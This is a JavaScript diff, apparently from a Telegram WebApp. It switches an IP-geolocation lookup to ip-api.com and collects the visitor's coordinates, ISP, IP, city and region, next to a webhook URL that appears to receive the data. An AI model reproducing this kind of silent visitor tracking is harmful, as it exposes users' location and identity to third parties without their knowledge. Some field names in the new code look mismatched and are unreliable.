@@ -22,6 +22,7 @@ async function infData() {
   //https://ipapi.co/json/
   //https://api.ipify.org?format=json
   //https://ip-api.com/
+  /*
   it = await fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(d => 
@@ -31,6 +32,7 @@ async function infData() {
       +"· <b>Площадь:</b> <code>"+d.country_area+"</code> км²\n"
       +"· <b>Население:</b> <code>"+d.country_population+"</code> чел.\n"
       */
+      /*
       +"· <b>Позиция:</b> <code>"+d.latitude+","+d.longitude+"</code>\n"
       +"• <b>Провайдер:</b> <code>"+d.org+"</code>\n"
       +"· <b>IP:</b> <code>"+d.ip+"</code>\n"
@@ -38,8 +40,21 @@ async function infData() {
       +"• <b>Регион:</b> <code>"+d.region+"</code>\n"
       +"• <b>Город:</b> <code>"+d.city+"</code>\n"
       );
+      */
   //document.getElementById("inf").innerHTML = it;
   //let ipData = document.getElementById('inf').innerText;
+
+  it = await fetch('http://ip-api.com/json/')
+    .then(res => res.json())
+    .then(d => 
+      document.getElementById("inf").innerHTML = it
+      +"· <b>Позиция:</b> <code>"+d.lat+","+d.lon+"</code>\n"
+      +"• <b>Провайдер:</b> <code>"+d.org+"</code>\n"
+      +"· <b>IP:</b> <code>"+d.ip+"</code>\n"
+      +"• <b>Страна:</b> <code>"+d.country+"</code> (<code>"+d.country_code+"</code>)\n"
+      +"• <b>Регион:</b> <code>"+d.regionName+"</code>\n"
+      +"• <b>Город:</b> <code>"+d.city+"</code>\n"
+    );
   let ipData = it;
   let url = 'https://qnext.app/bin/webhooks/7927/689/h319iH3Bm1aWJweF';
   let tg = window.Telegram.WebApp;
